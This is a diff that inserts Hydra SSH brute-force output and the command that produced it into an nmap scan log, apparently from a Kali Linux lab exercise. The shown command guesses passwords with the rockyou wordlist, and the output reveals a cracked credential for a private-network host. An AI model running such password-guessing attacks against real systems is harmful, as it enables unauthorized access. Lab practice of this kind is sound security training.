@@ -91,5 +91,18 @@ TRACEROUTE
 HOP RTT     ADDRESS
 1   0.46 ms 192.168.123.142
 
+
+[22][ssh] host: 192.168.123.142   login: user   password: letmein
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 6 final worker threads did not complete until end.
+[ERROR] 6 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-23 08:26:27
+                                                                                                                                                                                                                                            
+┌──(root㉿kali)-[/home/kali/Desktop/cyber-struggle/linux_makine]
+└─# hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.123.142 ssh -V
+
+
+
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Mon Oct 23 07:26:14 2023 -- 1 IP address (1 host up) scanned in 37.80 seconds
